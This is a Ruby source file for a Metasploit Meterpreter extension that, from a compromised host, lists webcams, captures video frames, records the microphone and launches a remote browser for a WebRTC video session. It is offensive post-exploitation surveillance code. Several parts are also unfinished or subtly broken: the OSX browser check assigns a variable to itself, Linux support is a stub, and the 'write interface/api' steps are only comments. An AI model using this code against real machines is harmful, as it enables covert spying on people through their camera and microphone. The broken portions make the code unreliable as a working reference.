# -*- coding: binary -*-

#require 'rex/post/meterpreter/extensions/process'

module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Webcam

###
#
# This meterpreter extension can list and capture from webcams and/or microphone
#
###
class Webcam

  include Msf::Post::Common
  include Msf::Post::File

  def initialize(client)
    @client = client
  end

  def session
    @client
  end

  def webcam_list
    response = client.send_request(Packet.create_request('webcam_list'))
    names = []
    response.get_tlvs( TLV_TYPE_WEBCAM_NAME ).each{ |tlv|
      names << tlv.value
    }
    names
  end

  # Starts recording video from video source of index +cam+
  def webcam_start(cam)
    request = Packet.create_request('webcam_start')
    request.add_tlv(TLV_TYPE_WEBCAM_INTERFACE_ID, cam)
    client.send_request(request)
    true
  end

  def webcam_get_frame(quality)
    request = Packet.create_request('webcam_get_frame')
    request.add_tlv(TLV_TYPE_WEBCAM_QUALITY, quality)
    response = client.send_request(request)
    response.get_tlv( TLV_TYPE_WEBCAM_IMAGE ).value
  end

  def webcam_stop
    client.send_request( Packet.create_request( 'webcam_stop' )  )
    true
  end

  def webcam_chat
    offerer_id = 'sinn3r_offer'
    ready_status = init_video_chat(offerer_id)
    unless ready_status
      raise RuntimeError, "Unable to find a suitable browser to initialize a WebRTC session."
    end

    remote_browser_path = get_webrtc_browser_path
    connect_video_chat(remote_browser_path, offerer_id)
  end

  # Record from default audio source for +duration+ seconds;
  # returns a low-quality wav file
  def record_mic(duration)
    request = Packet.create_request('webcam_audio_record')
    request.add_tlv(TLV_TYPE_AUDIO_DURATION, duration)
    response = client.send_request(request)
    response.get_tlv( TLV_TYPE_AUDIO_DATA ).value
  end

  attr_accessor :client


  private

  def get_webrtc_browser_path
    found_browser_path = ''

    case client.platform
    when /win/
      drive = session.fs.file.expand_path("%SYSTEMDRIVE%")

      [
        "Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "Program Files\\Mozilla Firefox\\firefox.exe",
        "Program Files\\Opera\\launcher.exe"
      ].each do |browser_path|
        path = "#{drive}\\#{browser_path}"
        if file?(path)
          found_browser_path = path
          break
        end
      end

    when /osx|bsd/
      [
        '/Applications/Google Chrome.app',
        '/Applications/Firefox.app',
      ].each do |browser_path|
        found_browser_path = found_browser_path
        break
      end
    when /linux|unix/
      # Need to add support for Linux
    end

    found_browser_path
  end

  def init_video_chat(offerer_id)
    interface = load_interface('offerer.html')
    api       = load_api_code
    # Write interface
    # Write api
    Rex::Compat.open_webrtc_browser
  end


  def connect_video_chat(remote_browser_path, offerer_id)
    interface = load_interface('answerer.html')
    api       = load_api_code
    # Write interface
    # write api

    exec_opts = {'Hidden' => false, 'Channelized' => false}
    args = "--args --allow-file-access-from-files http://metasploit.com"
    session.sys.process.execute(remote_browser_path, args, exec_opts)
  end

  def load_interface(html_name)
    interface_path = ::File.join(Msf::Config.data_directory, 'webcam', html_name)
    interface_code = ''
    ::File.open(interface_path) { |f| interface_code = f.read }
    interface_code
  end

  def load_api_code
    js_api_path = ::File.join(Msf::Config.data_directory, 'webcam', 'api.js')
    api = ''
    ::File.open(js_api_path) { |f| api = f.read }
    api
  end

end

end; end; end; end; end; end
